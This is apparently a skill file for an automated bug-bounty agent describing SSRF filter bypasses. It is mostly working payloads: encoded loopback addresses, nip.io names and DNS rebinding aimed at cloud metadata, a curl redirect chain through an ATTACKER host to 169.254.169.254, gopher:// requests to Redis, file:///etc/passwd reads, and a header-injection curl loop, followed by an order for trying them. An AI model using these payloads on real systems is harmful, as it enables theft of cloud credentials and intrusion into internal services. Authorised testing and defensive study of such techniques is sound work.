---
name: attack-ssrf-filter-bypass
description: "SSRF filter bypass — IP encoding tricks, DNS rebinding, redirect chains, protocol alternates, header-based SSRF, IPv6/mapped forms"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - ssrf
  - bypass
  - rebinding
  - encoding
tech_stack:
  - web
cwe_ids:
  - CWE-918
chains_with:
  - attack-ssrf
  - attack-waf-bypass
prerequisites:
  - attack-ssrf
---

# SSRF Filter Bypass

## Objective

The fetcher validates the URL before requesting (blocklist of private IPs / metadata
hosts / protocols). Make a filtered target pass validation while still resolving
internally. All 11 bypass families in priority order.

## Methodology

### 1. IP representation tricks (blocklists match literal text)

```bash
# 127.0.0.1 → decimal, hex, octal, mixed, 32-bit int
http://2130706433/            # decimal
http://0x7f000001/            # hex
http://017700000001/          # octal
http://127.1/                 # short form
http://127.0.1/               # short form 2
http://[::1]/                 # IPv6 loopback
http://[0:0:0:0:0:ffff:127.0.0.1]/   # IPv4-mapped IPv6
http://%31%32%37%2e%30%2e%30%2e%31/  # URL-encoded
```

### 2. DNS names that resolve to internal/metadata

```bash
# nip.io / sslip.io style (same-host resolution)
http://169.254.169.254.nip.io/
http://metadata.google.internal.sslip.io/   # sslip resolves the PREFIX
# attacker-controlled DNS (rebinding)
http://rebind.yourdomain.tld/   # first resolve: public → allow; second: 169.254.169.254
```

### 3. Redirect chains (validate-then-fetch is bypassable)

```bash
# Your server 302s to the internal target — validator saw your public IP
curl "https://TARGET/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"
# open redirect on ANOTHER of the target's hosts as the pivot
```

### 4. Protocol alternates

```bash
http://ATTACKER:8888/@169.254.169.254/       # URL parser confusion (userinfo/@)
http://ATTACKER%2F%40169.254.169.254/        # encoded @ confusion
gopher://127.0.0.1:6379/_INFO                # if non-http schemes allowed
file:///etc/passwd                           # scheme allowlist missing
```

### 5. Header-based SSRF (often missed entirely)

```bash
for hdr in "X-Forwarded-For: 169.254.169.254" "X-Real-IP: 169.254.169.254" \
           "X-Forwarded-Host: 169.254.169.254" "Forwarded: for=169.254.169.254"; do
  curl -H "$hdr" "https://TARGET/api/fetch?url=http://internal-ignored/"
done
```

### 6. Rare addresses that resolve internally

```bash
http://0/                    # 0.0.0.0 → localhost on some stacks
http://127.0.0.1.nip.io/     # public DNS name for loopback (passes allowlists)
http://[::]/ http://[0000::1]/
```

## Bypass decision order

1. Try representations first (silent, fast, no infra)
2. Then nip.io/sslip (public DNS, no rebinding infra needed)
3. Then redirect chains (need your server or an open redirect)
4. Then rebinding (needs DNS infra — detectable, slower)
5. Header-based LAST but check it FIRST if body-SSRF is dead (it's one curl)

## Proof

Same as classic SSRF — the bypass only matters as part of a confirmed internal access.
Log the exact bypass family used: programs rate "novel bypass" findings higher.
